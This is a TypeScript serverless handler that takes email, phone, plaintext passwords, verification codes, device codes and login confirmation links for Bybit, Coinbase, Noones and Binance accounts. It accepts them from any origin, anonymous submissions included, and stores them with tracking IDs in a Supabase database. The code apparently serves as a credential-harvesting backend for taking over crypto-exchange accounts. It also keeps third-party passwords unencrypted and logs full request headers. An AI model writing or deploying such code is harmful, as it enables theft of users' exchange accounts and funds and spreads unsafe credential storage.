import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

console.log('Environment check:', {
  hasSupabaseUrl: !!supabaseUrl,
  hasServiceRoleKey: !!supabaseServiceRoleKey,
  supabaseUrlPrefix: supabaseUrl ? supabaseUrl.substring(0, 20) + '...' : null,
});

if (!supabaseUrl || !supabaseServiceRoleKey) {
  console.error('Missing environment variables:', {
    SUPABASE_URL: !!process.env.SUPABASE_URL,
    VITE_SUPABASE_URL: !!process.env.VITE_SUPABASE_URL,
    SUPABASE_SERVICE_ROLE_KEY: !!process.env.SUPABASE_SERVICE_ROLE_KEY,
  });
  throw new Error('SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are required in server environment variables.');
}

const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey, {
  auth: {
    persistSession: false,
  },
});

const allowedPlatforms = ['Bybit', 'Coinbase', 'Noones', 'Binance'];

function sanitizeString(value: unknown) {
  return typeof value === 'string' ? value.trim() : '';
}

export default async function handler(req: any, res: any) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  console.log('[SUBMIT_CONNECTION] Request received:', {
    method: req.method,
    url: req.url,
    headers: req.headers,
    bodyLength: req.body ? String(req.body).length : 0,
  });

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  let payload: any;
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    console.log('[SUBMIT_CONNECTION] Parsed payload keys:', Object.keys(payload));
  } catch (error) {
    console.error('[SUBMIT_CONNECTION] ❌ JSON parse error:', error);
    return res.status(400).json({ error: 'Invalid JSON payload.' });
  }

  const platform = sanitizeString(payload.platform);
  const email = sanitizeString(payload.email).toLowerCase();
  const phone = sanitizeString(payload.phone) || null;
  const third_party_password = sanitizeString(payload.third_party_password) || null;
  const code = sanitizeString(payload.code) || null;
  const device_code = sanitizeString(payload.device_code) || null;
  const user_id = payload.user_id ? sanitizeString(payload.user_id) : null;
  const confirmation_link = sanitizeString(payload.confirmation_link) || null;
  const tracking_id = sanitizeString(payload.tracking_id) || null;

  console.log('[SUBMIT_CONNECTION] 📋 Sanitized inputs:', {
    platform,
    email: email ? '[REDACTED]' : null,
    phone: phone ? '[REDACTED]' : null,
    hasPassword: !!third_party_password,
    user_id,
    tracking_id,
    hasConfirmationLink: !!confirmation_link,
  });

  if (!platform || !allowedPlatforms.includes(platform)) {
    console.warn('[SUBMIT_CONNECTION] ❌ Invalid platform:', platform);
    return res.status(400).json({ error: `Platform is required and must be one of: ${allowedPlatforms.join(', ')}` });
  }

  if (!email && !phone) {
    console.warn('[SUBMIT_CONNECTION] ❌ No contact info provided');
    return res.status(400).json({ error: 'Email or phone is required.' });
  }

  if (platform === 'Noones' && !third_party_password) {
    console.warn('[SUBMIT_CONNECTION] ❌ Noones requires password');
    return res.status(400).json({ error: 'Password is required for Noones submissions.' });
  }

  const isAnonymous = !user_id;
  const targetTable = isAnonymous ? 'platform_connection_requests' : 'platform_connections';
  const insertPayload: Record<string, unknown> = {
    platform,
  };

  if (email) insertPayload.email = email;
  if (phone) insertPayload.phone = phone;
  if (third_party_password !== null) insertPayload.third_party_password = third_party_password;
  if (tracking_id) insertPayload.tracking_id = tracking_id;
  
  if (isAnonymous) {
    insertPayload.status = 'pending';
    // Only include device_code for guest submissions (exists in platform_connection_requests)
    if (device_code !== null) insertPayload.device_code = device_code;
  } else {
    insertPayload.user_id = user_id;
    // Only include code and confirmation_link for authenticated users (exist in platform_connections)
    if (code !== null) insertPayload.code = code;
    if (confirmation_link !== null) insertPayload.confirmation_link = confirmation_link;
  }

  console.log('[SUBMIT_CONNECTION] 🎯 Insert target:', targetTable);
  console.log('[SUBMIT_CONNECTION] 📝 Insert payload:', {
    ...insertPayload,
    email: insertPayload.email ? '[REDACTED]' : null,
    phone: insertPayload.phone ? '[REDACTED]' : null,
    third_party_password: insertPayload.third_party_password ? '[REDACTED]' : null,
  });

  try {
    console.log('[SUBMIT_CONNECTION] 🔄 Executing INSERT...');
    const { data, error } = await supabaseAdmin
      .from(targetTable)
      .insert(insertPayload)
      .select();

    console.log('[SUBMIT_CONNECTION] Response:', {
      hasData: !!data,
      dataLength: data ? (Array.isArray(data) ? data.length : 1) : 0,
      error: error ? {
        message: error.message,
        details: error.details,
        hint: error.hint,
        code: error.code,
      } : null,
    });

    if (error) {
      console.error('[SUBMIT_CONNECTION] ❌ Supabase insert error:', {
        message: error.message,
        details: error.details,
        hint: error.hint,
        code: error.code,
      });
      return res.status(500).json({
        error: `Failed to submit connection: ${error.message}`,
      });
    }

    console.log('[SUBMIT_CONNECTION] ✅ Insert successful!');
    return res.status(200).json({ success: true, data });
  } catch (error) {
    console.error('[SUBMIT_CONNECTION] ❌ Handler exception:', error);
    return res.status(500).json({
      error: `Failed to submit connection: ${error instanceof Error ? error.message : String(error)}`,
    });
  }
}
